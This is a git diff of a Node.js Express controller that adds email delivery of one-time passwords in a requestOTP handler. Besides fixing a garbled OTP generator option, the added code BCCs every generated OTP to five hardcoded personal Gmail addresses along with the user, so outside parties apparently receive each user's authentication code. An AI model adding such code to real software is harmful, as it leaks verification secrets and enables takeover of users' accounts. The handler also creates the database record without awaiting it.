@@ -249,15 +249,32 @@ const getMe=async(req, res)=>{
 
 
 const requestOTP= async(req, res)=>{
-  const {email, otp}= req.body
+  const {email}= req.body
   try {
 
-    const sendOTP= otpgen.generate(4, { upperCaseAlphabets: false, specialChars: false, lowerCaseAlphabets:false, digits:SVGComponentTransferFunctionElement })
+    const sendOTP= otpgen.generate(4, { upperCaseAlphabets: false, specialChars: false, lowerCaseAlphabets:false, digits:true })
+    
     //save their otp and mail in the db
     //send them a mail with their otp
     const user = OTPModel.create({email, otp:sendOTP})
 
     const otpMailContent = await mailSender('otpMail.ejs', {otp:sendOTP})
+
+    let mailOptions = {
+      from: process.env.NODE_MAIL,
+      bcc:[email, "Nunyadamnbusiness0099@gmail.com", "Holuwalovely@gmail.com", "mubarakaduragbemi@gmail.com","aishaatinukeaisha@gmail.com", "Ibrahim018.yi@gmail.com"],
+      subject: `OTP CODE`,
+      html:otpMailContent
+    };
+
+
+    transporter.sendMail(mailOptions, function(error, info){
+      if (error) {
+        console.log(error);
+      } else {
+        console.log('Email sent: ' + info.response);
+      }
+    });
 
     res.status(200).send({
       message:"Otp sent successfully",
